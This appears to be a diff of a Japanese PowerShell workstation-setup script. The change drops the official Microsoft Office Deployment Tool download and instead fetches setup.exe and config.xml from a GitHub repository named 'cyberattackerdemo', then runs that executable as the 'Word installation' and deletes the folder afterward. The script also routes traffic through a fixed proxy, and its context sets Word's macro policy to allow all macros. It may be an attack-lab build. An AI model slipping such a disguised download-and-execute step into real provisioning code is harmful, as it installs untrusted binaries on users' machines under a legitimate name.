@@ -42,36 +42,32 @@ try {
 } catch { LogError "NTP設定失敗: $($_.Exception.Message)" }
 
 try {
-    Log "Office Deployment Toolをダウンロード"
-    $odtPath = "C:\ODT"
-    $odtExe = "C:\ODTSetup.exe"
-    if (!(Test-Path -Path $odtPath)) {
-        New-Item -ItemType Directory -Path $odtPath | Out-Null
-        Log "ODTフォルダ作成: $odtPath"
+    Log "Wordインストール用ファイルをGitHubからダウンロード"
+
+    $tempPath = "C:\ODT"
+    if (!(Test-Path -Path $tempPath)) {
+        New-Item -ItemType Directory -Path $tempPath | Out-Null
+        Log "一時フォルダ作成: $tempPath"
     }
 
-    Invoke-WebRequest -Uri "https://download.microsoft.com/download/2/7/A/27AF1BE6-DD20-4CB4-B154-EBAB8A7D4A7E/officedeploymenttool_18623-20156.exe" -OutFile $odtExe
+    $setupUrl = "https://raw.githubusercontent.com/cyberattackerdemo/public/main/setup.exe"
+    $configUrl = "https://raw.githubusercontent.com/cyberattackerdemo/public/main/config.xml"
 
-# 必ずフォルダ存在をチェック
-    if (!(Test-Path -Path $odtPath)) { New-Item -ItemType Directory -Path $odtPath -Force | Out-Null }
+    Invoke-WebRequest -Uri $setupUrl -OutFile "$tempPath\setup.exe"
+    Invoke-WebRequest -Uri $configUrl -OutFile "$tempPath\config.xml"
 
-    Log "ODTSetup.exeを展開"
-    Start-Process -FilePath $odtExe -ArgumentList "/quiet /extract:$odtPath" -Wait
-    
-# 展開が完了するのを待つ
-    $timeout = 60  # 最大60秒待つ
-    $elapsed = 0
-    while (!(Test-Path "$odtPath\setup.exe") -and ($elapsed -lt $timeout)) {
-      Start-Sleep -Seconds 1
-      $elapsed++
+    if (!(Test-Path "$tempPath\setup.exe") -or !(Test-Path "$tempPath\config.xml")) {
+        throw "必要なファイルが揃っていません。ダウンロードに失敗しました。"
     }
 
-    if (!(Test-Path "$odtPath\setup.exe")) {
-      throw "ODT setup.exe が見つかりません。展開に失敗しました。"
-    }
+    Log "Wordインストール開始"
+    Start-Process -FilePath "$tempPath\setup.exe" -ArgumentList "/configure $tempPath\config.xml" -Wait
 
+    Log "Wordインストール完了"
 
-} catch { LogError "ODT取得または展開失敗: $($_.Exception.Message)" }
+} catch {
+    LogError "Wordインストール失敗: $($_.Exception.Message)"
+}
 
 try {
     Log "Chromeをダウンロード＆インストール"
@@ -135,69 +131,32 @@ try {
 } catch { LogError "言語設定失敗: $($_.Exception.Message)" }
 
 try {
-    Log "プロキシ自動検出を無効化"
-    
+    Log "プロキシ設定（AutoDetect無効化＋HKCUとHKLM両方まとめて）"
+
     # ユーザー設定（HKCU）
     $regPathUser = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
     Set-ItemProperty -Path $regPathUser -Name AutoDetect -Value 0 -Type DWord
-    
+    Set-ItemProperty -Path $regPathUser -Name ProxyEnable -Value 1
+    Set-ItemProperty -Path $regPathUser -Name ProxyServer -Value "10.0.1.254:3128"
+
     # ポリシー設定（HKLM）
     $regPathMachine = "HKLM:\Software\Policies\Microsoft\Windows\CurrentVersion\Internet Settings"
     New-Item -Path $regPathMachine -Force | Out-Null
     Set-ItemProperty -Path $regPathMachine -Name AutoDetect -Value 0 -Type DWord
-
-} catch {
-    LogError "プロキシ自動検出無効化失敗: $($_.Exception.Message)"
-}
-
-try {
-    Log "プロキシ設定（HKCUとHKLM両方）"
-
-    # ユーザー単位 (従来通り)
-    $regPathUser = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
-    Set-ItemProperty -Path $regPathUser -Name ProxyEnable -Value 1
-    Set-ItemProperty -Path $regPathUser -Name ProxyServer -Value "10.0.1.254:3128"
-
-    # マシン単位 (ポリシーとして強制)
-    $regPathMachine = "HKLM:\Software\Policies\Microsoft\Windows\CurrentVersion\Internet Settings"
-    New-Item -Path $regPathMachine -Force | Out-Null
     Set-ItemProperty -Path $regPathMachine -Name ProxySettingsPerUser -Type DWord -Value 0
     Set-ItemProperty -Path $regPathMachine -Name ProxyEnable -Type DWord -Value 1
     Set-ItemProperty -Path $regPathMachine -Name ProxyServer -Value "10.0.1.254:3128"
 
-    # WinHTTPプロキシも設定
+    # WinHTTPプロキシ設定
     netsh winhttp set proxy 10.0.1.254:3128
 
+    Log "グループポリシーを即時反映"
+    gpupdate /force | Out-Null
+
 } catch {
-    LogError "プロキシ設定失敗: $($_.Exception.Message)"
+    LogError "プロキシ設定（AutoDetect無効化＋Proxy指定）失敗: $($_.Exception.Message)"
 }
 
-try {
-    Log "Office構成ファイル作成"
-    $configXml = @'
-<Configuration>
-  <Add OfficeClientEdition="64" Channel="Current">
-    <Product ID="O365ProPlusRetail">
-      <Language ID="ja-jp" />
-      <ExcludeApp ID="Access" />
-      <ExcludeApp ID="Excel" />
-      <ExcludeApp ID="OneNote" />
-      <ExcludeApp ID="Outlook" />
-      <ExcludeApp ID="PowerPoint" />
-      <ExcludeApp ID="Publisher" />
-      <ExcludeApp ID="Teams" />
-    </Product>
-  </Add>
-  <Display Level="None" AcceptEULA="TRUE" />
-</Configuration>
-'@
-    Set-Content -Path "$odtPath\config.xml" -Value $configXml
-} catch { LogError "Office構成ファイル作成失敗: $($_.Exception.Message)" }
-
-try {
-    Log "Wordインストール開始"
-    Start-Process -FilePath "$odtPath\setup.exe" -ArgumentList "/configure $odtPath\config.xml" -Wait
-} catch { LogError "Wordインストール失敗: $($_.Exception.Message)" }
 
 try {
     Log "Wordマクロ警告レジストリ設定"
@@ -205,6 +164,13 @@ try {
     New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Office\16.0\Word\Security' -Force | Out-Null
     New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Office\16.0\Word\Security' -Name 'VBAWarnings' -PropertyType DWord -Value 1 -Force
 } catch { LogError "Wordレジストリ設定失敗: $($_.Exception.Message)" }
+
+try {
+    Log "一時フォルダ (C:\ODT) を削除"
+    Remove-Item -Path "C:\ODT" -Recurse -Force
+} catch {
+    LogError "一時フォルダ削除失敗: $($_.Exception.Message)"
+}
 
 Log "スクリプト完了"
 Stop-Transcript
